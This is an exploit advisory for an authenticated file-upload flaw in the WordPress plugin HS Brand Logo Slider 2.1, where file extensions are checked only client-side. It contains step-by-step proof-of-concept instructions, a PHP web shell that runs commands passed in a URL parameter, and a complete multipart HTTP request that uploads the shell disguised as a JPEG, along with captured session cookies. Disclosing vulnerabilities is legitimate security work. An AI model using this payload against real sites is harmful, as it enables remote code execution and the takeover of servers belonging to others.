---
title: "WordPress Plugin HS Brand Logo Slider 2.1 - 'logoupload' File Upload"
date: 2020-10-22T10:57:56-03:00
draft: false
type: RCE
platform: "webapps"
---


```html

.:: Description ::.
An Authenticated User Can Bypass Uploader of the Plugin and Upload Arbitary File
Because the extension of the Uploaded Flie is Checked on Client Side

.:: Vulnerable File ::.
/wp-admin/admin.php?page=hs-brand-logo-slider.php

.:: Vulnerable Code ::.
Content-Disposition: form-data; name="logoupload"; filename="a.php"
Content-Type: image/jpeg
<?php echo system($_GET['cmd']); ?>

.:: Proof Of Concept (Poc) ::.
Step 1 - Log in to your account , Select hs-brand-logo-slider from the menu
Upload
Step 2 - Stop the upload request with burp suite
Step 3 - Rename the file, for example a.jpg to a.php
Step 4 - Your shell has been uploaded, showing the file path in the table

.:: Sample Request::.

POST /wp-admin/admin.php?page=hs-brand-logo-slider.php HTTP/1.1
Host: 172.16.1.17:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.1.17:81/wp-admin/admin.php?page=hs-brand-logo-slider.php
Content-Type: multipart/form-data; boundary=---------------------------407602771734524910834293111227
Content-Length: 81765
Origin: http://172.16.1.17:81
Connection: close
Cookie: wordpress_558570ec66c8a5729fc0bd982edbc38a=admin%7C1603353703%7Ckvhq1mWuwe5MGz3wZpw8Rxi5eiJtxYMQDHzZFCkebGS%7C15d778148be9d49e48b6275e009642192e10b1d8a9e5e44a191141084f2618b6; wp-settings-time-2=1592045029; wp-settings-2=libraryContent%3Dbrowse%26editor%3Dtinymce; wp_learn_press_session_558570ec66c8a5729fc0bd982edbc38a=9c5476d130f39254b97895578a6cf9e2%7C%7C1603353694%7C%7Cd6957c27eda7a311e486866587a08500; wordpress_test_cookie=WP+Cookie+check; wordpress_lp_guest=fad4f6783283c86762dc8944423947d0; wordpress_logged_in_558570ec66c8a5729fc0bd982edbc38a=admin%7C1603353703%7Ckvhq1mWuwe5MGz3wZpw8Rxi5eiJtxYMQDHzZFCkebGS%7C80d7786798b351d10cbdfe07ba50c31d2400ccbfb173d4b90255cab42791ccd7; wp-settings-time-1=1603180907
Upgrade-Insecure-Requests: 1

-----------------------------407602771734524910834293111227
Content-Disposition: form-data; name="brandname"

aaa
-----------------------------407602771734524910834293111227
Content-Disposition: form-data; name="logoupload"; filename="eftekharr.php"
Content-Type: image/jpeg
<?php echo system($_GET['cmd']); ?>

-----------------------------407602771734524910834293111227
Content-Disposition: form-data; name="logourl"

http://aa.com
-----------------------------407602771734524910834293111227
Content-Disposition: form-data; name="sortorder"

1
-----------------------------407602771734524910834293111227
Content-Disposition: form-data; name="submit_data"

Submit
-----------------------------407602771734524910834293111227--



```